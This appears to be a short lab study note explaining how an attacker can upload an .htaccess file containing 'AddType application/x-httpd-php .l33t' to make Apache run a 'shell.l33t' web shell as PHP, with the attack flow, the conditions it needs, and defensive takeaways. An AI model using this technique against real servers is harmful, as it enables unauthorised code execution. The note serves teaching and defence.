# Overriding Server Configuration

## Overview

Some servers allow configuration files inside directories.

Examples:

```text
.htaccess
web.config
```

---

# Apache Example

Upload:

```text
.htaccess
```

with:

```apache
AddType application/x-httpd-php .l33t
```

---

Then upload:

```text
shell.l33t
```

---

Apache interprets:

```text
.l33t
```

as:

```text
PHP
```

---

# Attack Flow

```text
Upload .htaccess
        ↓
Change Server Behavior
        ↓
Upload Web Shell
        ↓
Code Execution
```

---

# Conditions Required

```text
Apache Server
AllowOverride Enabled
.htaccess Upload Allowed
```

---

# Related Lab

```text
Lab04
```

---

# Key Takeaways

- Configuration files can become attack vectors.
- Server behavior should not be user-controlled.